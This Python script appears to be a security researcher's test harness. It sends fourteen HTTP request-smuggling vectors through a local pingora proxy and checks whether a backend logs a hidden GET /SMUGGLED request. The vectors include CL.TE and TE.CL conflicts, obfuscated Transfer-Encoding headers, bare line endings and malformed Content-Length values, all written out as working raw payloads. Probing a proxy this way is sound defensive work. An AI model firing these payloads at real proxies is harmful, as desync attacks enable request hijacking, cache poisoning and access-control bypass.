#!/usr/bin/env python3
"""Send HTTP/1 request-smuggling vectors through the pingora proxy (:8898).

Each vector embeds a hidden `GET /SMUGGLED` request. If pingora's framing
desyncs from the Go backend, the backend logs a request with path=/SMUGGLED.
Classic CL/TE desync is normally mitigated by pingora re-serializing to the
upstream, so this probes edge cases of that re-serialization.
"""
import socket
import time

PROXY = ("127.0.0.1", 8898)
SMUG = b"GET /SMUGGLED HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n"


def send(raw: bytes, label: str):
    try:
        s = socket.create_connection(PROXY, timeout=4)
        s.sendall(raw)
        time.sleep(0.4)
        try:
            s.settimeout(1.0)
            _ = s.recv(8192)
        except Exception:
            pass
        s.close()
    except Exception as e:
        print(f"[{label}] send error: {e}")
    time.sleep(0.2)


def vectors():
    # Each vector's PRIMARY request path is unique (/<label>) so the backend
    # log maps 1:1 to the vector. SMUG keeps path /SMUGGLED. A /SMUGGLED line
    # therefore pinpoints exactly which vector produced it. For a vector whose
    # SMUG is embedded inside what pingora should treat as the request BODY,
    # a standalone /SMUGGLED request means pingora promoted body bytes to a
    # request = genuine desync. For cl_zeros / bare_lf_end (CL:0) and
    # pipelined_control, SMUG legitimately follows an empty body, so forwarding
    # it under pipelining is expected, not a desync.
    v = {}
    # 1. CL.TE: declare CL that hides a chunked body + smuggled request
    body = b"0\r\n\r\n" + SMUG
    v["cl_te"] = (
        b"POST /cl_te HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n%b" % (len(body), body)
    )
    # 2. TE.CL
    v["te_cl"] = (
        b"POST /te_cl HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n"
        b"Content-Length: 4\r\n\r\n"
        b"5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 3. obfuscated TE: space before colon
    v["te_space"] = (
        b"POST /te_space HTTP/1.1\r\nHost: x\r\nTransfer-Encoding : chunked\r\n"
        b"Content-Length: %d\r\n\r\n0\r\n\r\n%b" % (len(b"0\r\n\r\n")+len(SMUG), SMUG)
    )
    # 4. double TE
    v["te_double"] = (
        b"POST /te_double HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n"
        b"Transfer-Encoding: cow\r\n\r\n5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 5. TE with tab
    v["te_tab"] = (
        b"POST /te_tab HTTP/1.1\r\nHost: x\r\nTransfer-Encoding:\tchunked\r\n\r\n"
        b"5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 6. chunk-ext junk
    v["chunk_ext"] = (
        b"POST /chunk_ext HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"5c;ext=\"x\"\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 7. CL with leading zeros
    v["cl_zeros"] = (
        b"POST /cl_zeros HTTP/1.1\r\nHost: x\r\nContent-Length: 00\r\n\r\n" + SMUG
    )
    # 8. plain pipelined (legitimate) - control: backend SHOULD see /SMUGGLED
    #    (confirms the rig can observe a legit second pipelined request).
    v["pipelined_control"] = (
        b"GET /first HTTP/1.1\r\nHost: x\r\n\r\n" + SMUG
    )
    # ---- targeted probes from the 0.9.0 source audit (2026-10) ----
    # 9. bare-LF header terminator (\n\n not \r\n\r\n) + CL:0 (empty body).
    v["bare_lf_end"] = (
        b"POST /bare_lf_end HTTP/1.1\nHost: x\nContent-Length: 0\n\n" + SMUG
    )
    # 10. bare-LF between headers + CL/TE conflict. If pingora reads CL:44 it
    #     consumes SMUG as body; if a backend reads it differently -> desync.
    v["bare_lf_cl_te"] = (
        b"POST /bare_lf_cl_te HTTP/1.1\r\nHost: x\nContent-Length: 44\nTransfer-Encoding: chunked\r\n\r\n"
        b"0\r\n\r\n" + SMUG
    )
    # 11. illegal char in request line (forces pingora's escape+detach retry)
    #     combined with bare-LF header end (server.rs:442-474).
    v["escape_retry_lf"] = (
        b"GET /escape_retry_lf a HTTP/1.1\nHost: x\nContent-Length: 0\n\n" + SMUG
    )
    # 12. TE ordering: identity first, chunked last (common.rs takes LAST TE).
    v["te_identity_first"] = (
        b"POST /te_identity_first HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: identity\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 13. Content-Length with a leading '+' (Rust i64 parse accepts "+<n>").
    v["cl_plus"] = (
        b"POST /cl_plus HTTP/1.1\r\nHost: x\r\nContent-Length: +%d\r\n\r\n%b"
        % (len(SMUG), SMUG)
    )
    # 14. bare CR inside the chunk-size line (not CRLF).
    v["chunk_bare_cr"] = (
        b"POST /chunk_bare_cr HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"5c\rGET /SMUGGLED HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n\r\n0\r\n\r\n"
    )
    return v


def main():
    vs = vectors()
    for label, raw in vs.items():
        print(f"[send] {label} ({len(raw)} bytes)")
        send(raw, label)
    print("[done] all vectors sent")


if __name__ == "__main__":
    main()
